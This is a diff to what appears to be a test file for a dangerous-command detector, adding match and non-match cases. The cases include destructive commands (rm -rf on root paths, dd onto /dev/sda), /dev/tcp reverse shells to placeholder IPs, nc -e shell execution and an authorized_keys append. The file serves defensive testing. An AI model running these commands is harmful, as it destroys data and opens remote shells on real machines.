@@ -57,6 +57,11 @@ MUST_MATCH = [
     ("rm-rf-root", "rm -rf /etc/"),
     ("rm-rf-root", "rm -rf /etc/*"),
     ("rm-rf-root", "rm -r -f /boot"),
+    ("rm-rf-root", "rm -rf //"),  # repeated-slash root
+    ("rm-rf-root", "rm -rf ///"),
+    ("rm-rf-root", "rm -rf //etc"),
+    ("rm-rf-root", "rm -rf /etc/."),  # trailing dot-dir
+    ("rm-rf-root", "rm -rf /usr/."),
     ("rm-rf-home", "rm -rf ~"),
     ("rm-rf-home", "rm -rf ~/Documents "),
     ("rm-rf-home", "rm -r -f ~"),
@@ -70,6 +75,13 @@ MUST_MATCH = [
     ("dd-device", "dd if=/dev/zero of=/dev/sda bs=1m"),
     ("dd-device", "dd of=/dev/sdb if=disk.img"),  # of=/dev/ caught, not just if=
     ("dd-device", "dd if=/dev/sda of=backup.img"),
+    ("reverse-shell-devtcp", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"),
+    ("reverse-shell-devtcp", "cat < /dev/tcp/10.0.0.1/22"),
+    ("reverse-shell-devtcp", "exec 5<>/dev/udp/1.2.3.4/53"),
+    ("nc-exec-shell", "nc -e /bin/sh 1.2.3.4 4444"),
+    ("nc-exec-shell", "ncat -e /bin/bash 10.0.0.1 9001"),
+    ("nc-exec-shell", "ncat --exec /bin/sh 10.0.0.1 9001"),
+    ("nc-exec-shell", "ncat --sh-exec /bin/bash 10.0.0.1 9001"),
     ("authorized-keys", "echo key >> ~/.ssh/authorized_keys"),
     ("launchctl", "launchctl load -w ~/Library/LaunchAgents/x.plist"),
     ("launchctl", "launchctl bootstrap gui/501 x.plist"),
@@ -118,6 +130,7 @@ MUST_NOT_MATCH = [
     ("rm-rf-root", "rm -rf /Users/evan/proj"),
     ("rm-rf-root", "rm -rf /opt/app"),
     ("rm-rf-root", "rm -rf ./node_modules"),
+    ("rm-rf-root", "rm -rf //tmp/build"),  # repeated slash, scratch subpath still excluded
     ("rm-rf-home", "rm -rf ./home"),
     ("rm-rf-home", "rm -rf $HOMEWORK"),  # not the HOME var
     ("mkfs", "mkfstool --help"),
@@ -132,6 +145,19 @@ MUST_NOT_MATCH = [
     ("wget-pipe-shell", "wget https://x -O out"),
     ("eval", "the medieval period"),  # word boundary
     ("sudo", "echo pseudocode example"),  # no sudo token
+    ("reverse-shell-devtcp", "cat /dev/null"),  # not tcp/udp
+    ("reverse-shell-devtcp", "dd if=/dev/urandom of=out.img"),
+    ("reverse-shell-devtcp", "cat src/dev/udp/handler.c"),  # path substring, not host/port form
+    ("reverse-shell-devtcp", "git add lib/dev/tcp/client.go"),
+    ("reverse-shell-devtcp", "cat pkg/dev/tcp/v4/2parse.go"),  # embedded path, digit-leading segment
+    ("reverse-shell-devtcp", "cat app/dev/tcp/config/8080.yaml"),
+    ("reverse-shell-devtcp", "vim internal/net/dev/tcp/proto/0rtt.rs"),
+    ("nc-exec-shell", "nc -l 4444"),  # read-only listener
+    ("nc-exec-shell", "nc -zv example.com 80"),  # port scan
+    ("nc-exec-shell", "nc -C host 80"),  # CRLF flag, not exec (case-insensitive -c collision)
+    ("nc-exec-shell", "ncat --source-port 12345 host 80"),  # trailing 'e' must not fire
+    ("nc-exec-shell", "nc -zv host 22 && rsync -e ssh a b"),  # -e belongs to rsync past the && boundary
+    ("nc-exec-shell", "ncat --version && sed -e 's/a/b/' f"),  # -e past the && boundary
 ]
 
 
